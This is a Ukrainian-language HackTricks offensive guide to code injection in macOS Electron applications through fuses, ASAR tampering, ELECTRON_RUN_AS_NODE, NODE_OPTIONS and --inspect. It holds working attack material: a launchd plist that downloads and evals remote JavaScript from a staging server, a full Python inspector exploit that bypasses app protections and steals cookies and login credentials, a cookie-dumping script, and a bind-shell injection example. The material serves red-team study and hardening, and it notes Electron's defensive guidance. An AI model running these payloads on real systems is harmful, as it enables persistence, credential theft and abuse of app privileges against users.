# Ін’єкція в Electron Applications у macOS

{{#include ../../../banners/hacktricks-training.md}}

## Основна інформація

Якщо ви не знаєте, що таке Electron, тут можна знайти [**багато інформації**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Але наразі достатньо знати, що Electron запускає **node**.\
А node має деякі **параметри** та **env variables**, які можна використати, щоб **змусити його виконувати інший код** окрім коду зазначеного файлу.

### Electron Fuses

Далі буде розглянуто ці техніки, але останнім часом Electron додав кілька **прапорців безпеки для їх блокування**. Це [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), і саме вони використовуються, щоб **перешкоджати** Electron apps у macOS **завантажувати довільний код**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Якщо вимкнено, це перешкоджає використанню env var **`ELECTRON_RUN_AS_NODE`** для ін’єкції коду.
- **`EnableNodeCliInspectArguments`**: Якщо вимкнено, параметри на кшталт `--inspect`, `--inspect-brk` не враховуються. Це усуває такий спосіб ін’єкції коду.
- **`EnableEmbeddedAsarIntegrityValidation`**: Якщо ввімкнено, завантажений **`asar`** **файл** буде **перевірено** macOS. Таким чином **запобігається** **ін’єкції коду** через змінення вмісту цього файлу.
- **`OnlyLoadAppFromAsar`**: Якщо це ввімкнено, замість пошуку для завантаження в такому порядку: **`app.asar`**, **`app`** і, нарешті, **`default_app.asar`**, буде перевірено та використано лише app.asar. Це гарантує, що в разі **комбінування** з fuse **`embeddedAsarIntegrityValidation`** буде **неможливо** **завантажити неперевірений код**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Якщо ввімкнено, browser process використовує файл із назвою `browser_v8_context_snapshot.bin` для свого V8 snapshot.

Ще один цікавий fuse, який не запобігає ін’єкції коду:

- **EnableCookieEncryption**: Якщо ввімкнено, cookie store на диску шифрується за допомогою криптографічних ключів рівня OS.

### Перевірка Electron Fuses

Ви можете **перевірити ці прапорці** з application за допомогою:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Зміна Electron Fuses

Як [**зазначено в документації**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), конфігурація **Electron Fuses** зберігається всередині **Electron binary**, який десь містить рядок **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.<sup>[[1]](#references)</sup>

У macOS applications це зазвичай `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Ви можете завантажити цей файл у [https://hexed.it/](https://hexed.it/) і виконати пошук попереднього рядка. Після цього рядка в ASCII можна побачити число "0" або "1", яке вказує, чи вимкнено або увімкнено кожен fuse. Просто змініть hex-код (`0x30` — це `0`, а `0x31` — `1`), щоб **змінити значення fuse**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу: якщо спробувати **перезаписати** бінарний файл **`Electron Framework`** усередині application зі зміненими цими байтами, app не запуститься.

## RCE шляхом додавання коду до Electron Applications

Electron App може використовувати **external JS/HTML files**, тому attacker може інжектити код у ці файли, підпис яких не перевірятиметься, і виконувати довільний код у контексті app.

> [!CAUTION]
> Однак наразі є 2 обмеження:
>
> - Для модифікації App **потрібен** дозвіл **`kTCCServiceSystemPolicyAppBundles`**, тому за замовчуванням це більше неможливо.
> - Скомпільований файл **`asap`** зазвичай має увімкнені fuses **`embeddedAsarIntegrityValidation`** і **`onlyLoadAppFromAsar`**
>
> Це робить цей шлях атаки складнішим (або неможливим).

Зверніть увагу, що вимогу **`kTCCServiceSystemPolicyAppBundles`** можна обійти, скопіювавши application в інший каталог (наприклад, **`/tmp`**), перейменувавши папку **`app.app/Contents`** на **`app.app/NotCon`**, **модифікувавши** файл **asar** за допомогою вашого **шкідливого** коду, перейменувавши її назад на **`app.app/Contents`** і запустивши його.<sup>[[5]](#references)</sup>

Розпакувати код із файлу asar можна за допомогою:
```bash
npx asar extract app.asar app-decomp
```
І знову запакуйте його після внесення змін за допомогою:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE with ELECTRON_RUN_AS_NODE

Відповідно до [**документації**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), якщо цю змінну середовища встановлено, процес буде запущено як звичайний процес Node.js.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> Якщо fuse **`RunAsNode`** вимкнено, змінну середовища **`ELECTRON_RUN_AS_NODE`** буде проігноровано, і це не спрацює.

### Injection з App Plist

Як [**запропоновано тут**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), ви можете зловживати цією змінною середовища у plist для забезпечення персистентності:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE з `NODE_OPTIONS`

Ви можете зберегти payload в іншому файлі та виконати його:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> Якщо fuse **`EnableNodeOptionsEnvironmentVariable`** **disabled**, app **ігноруватиме** env var **NODE_OPTIONS** під час запуску, якщо не встановлено env variable **`ELECTRON_RUN_AS_NODE`**, яку також буде **ігноровано**, якщо fuse **`RunAsNode`** **disabled**.
>
> Якщо не встановити **`ELECTRON_RUN_AS_NODE`**, ви побачите **error**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection from the App Plist

Ви можете abuse це env variable у plist, щоб maintain persistence, додавши такі keys:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE через inspecting

Згідно з [**цим**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), якщо запустити Electron application з такими flags, як **`--inspect`**, **`--inspect-brk`** і **`--remote-debugging-port`**, буде **відкрито debug port**, до якого можна підключитися (наприклад, через Chrome у `chrome://inspect`), і ви зможете **інжектити код у нього** або навіть запускати нові процеси.<sup>[[7]](#references)</sup>\
Наприклад:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
У [**цьому дописі в блозі**](https://hackerone.com/reports/1274695) цим debugging зловживають, щоб змусити headless chrome **завантажувати довільні файли в довільні місця**.<sup>[[8]](#references)</sup>

> [!TIP]
> Якщо app має власний спосіб перевірки наявності env variables або params, таких як `--inspect`, можна спробувати **обійти** її в runtime за допомогою arg `--inspect-brk`, який **зупинить виконання** на початку роботи app і виконає bypass (наприклад, перезаписавши args або env variables поточного процесу).

Наведене нижче було exploit: під час моніторингу та запуску app з param `--inspect-brk` можна було обійти наявний custom захист (перезаписавши params процесу для видалення `--inspect-brk`), а потім інжектити JS payload для отримання cookies і credentials з app:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Якщо fuse **`EnableNodeCliInspectArguments`** вимкнено, app **ігноруватиме параметри node** (наприклад, `--inspect`) під час запуску, якщо не встановлено env variable **`ELECTRON_RUN_AS_NODE`**, яке також буде **проігноровано**, якщо fuse **`RunAsNode`** вимкнено.
>
> Однак ви все ще можете використовувати **electron param `--remote-debugging-port=9229`**, але попередній payload не працюватиме для запуску інших процесів.

За допомогою param **`--remote-debugging-port=9222`** можна викрасти певну інформацію з Electron App, наприклад **history** (за допомогою GET commands) або **cookies** браузера (оскільки вони **розшифровуються** всередині браузера, а існує **json endpoint**, який їх надає).

Дізнатися, як це зробити, можна [**тут**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) і [**тут**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) та використати automatic tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) або простий script на кшталт:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection з App Plist

Ви можете зловживати цією змінною середовища у plist, щоб забезпечити persistence, додавши такі ключі:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## Обхід TCC із використанням старіших версій

> [!TIP]
> Демон TCC у macOS не перевіряє версію запущеної application. Тому, якщо ви **не можете інжектити code в Electron application** за допомогою будь-якої з попередніх технік, ви можете завантажити попередню версію APP і виконати в неї ін'єкцію code, оскільки вона все одно отримає привілеї TCC (якщо цьому не перешкоджає Trust Cache).

## Запуск не- JS Code

Попередні техніки дають змогу запускати **JS code всередині процесу Electron application**. Однак пам’ятайте, що **дочірні процеси запускаються з тим самим sandbox profile**, що й батьківська application, і **успадковують її TCC permissions**.\
Тому, якщо ви хочете зловживати entitlements для доступу до камери або мікрофона, наприклад, ви можете просто **запустити інший binary з процесу**.

## Відомі Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – обхід цілісності ASAR

Electron ≤22.3.23 і різні pre-release версії 23-27 дозволяли attacker із правом запису до папки `.app/Contents/Resources` обходити fuses `embeddedAsarIntegrityValidation` **і** `onlyLoadAppFromAsar`. Помилка полягала у *file-type confusion* в integrity checker, через яку замість перевіреного archive можна було завантажити **directory з назвою `app.asar`**, тому будь-який JavaScript, розміщений у цій directory, виконувався під час запуску application. Отже, навіть vendors, які дотримувалися hardening guidance та активували обидва fuses, усе одно залишалися vulnerable у macOS.<sup>[[3]](#references)</sup>

Виправлені версії Electron: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** і **27.0.0-alpha.7**. Attackers, які виявлять application зі старою build, можуть перезаписати `Contents/Resources/app.asar` власною directory, щоб виконати code з TCC entitlements application.<sup>[[3]](#references)</sup>

### Кластер CVE 2024 року “RunAsNode” / “enableNodeCliInspectArguments”

У січні 2024 року серія CVE (CVE-2024-23738 — CVE-2024-23743) показала, що багато Electron apps постачаються з досі активними fuses **RunAsNode** і **EnableNodeCliInspectArguments**. Тому local attacker може повторно запустити program зі змінною середовища `ELECTRON_RUN_AS_NODE=1` або flags на кшталт `--inspect-brk`, щоб перетворити її на *generic* Node.js process і успадкувати всі sandbox та TCC permissions application.<sup>[[4]](#references)</sup>

Хоча Electron team оскаржила оцінку “critical” і зазначила, що attacker уже має потребувати local code–execution, ця проблема все одно є цінною під час post-exploitation, оскільки перетворює будь-який vulnerable Electron bundle на *living-off-the-land* binary, який може, наприклад, читати Contacts, Photos або інші sensitive resources, раніше надані desktop app.<sup>[[4]](#references)</sup>

Defensive guidance від Electron maintainers:<sup>[[4]](#references)</sup>

* Вимикайте fuses `RunAsNode` і `EnableNodeCliInspectArguments` у production builds.
* Використовуйте новіший API **UtilityProcess**, якщо application справді потребує helper Node.js process, замість повторного ввімкнення цих fuses.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) можна легко використовувати, щоб **знаходити vulnerable electron applications** і виконувати в них ін'єкцію code. Цей tool спробує використати техніку **`--inspect`**:<sup>[[5]](#references)</sup>

Вам потрібно скомпілювати його самостійно, після чого можна використовувати так:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki було розроблено для встановлення backdoor в Electron applications шляхом заміни JavaScript-файлів застосунків на JavaScript-файли Loki Command & Control.

## Посилання

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [MacOS Injection via Third-Party Frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ASAR Integrity bypass via filetype confusion (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Statement regarding 'runAsNode' CVEs - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - A New Weapon in Your Red Teaming Armory - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Environment Variables | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Why Electron apps can't store your secrets confidentially: --inspect option](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne Report #1274695 - Electron debugging abused to download arbitrary files](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Dumping Cookies with Chromium's Remote Debugger Port - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Debugging Cookie Dumping Failures with Chromium's Remote Debugger - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
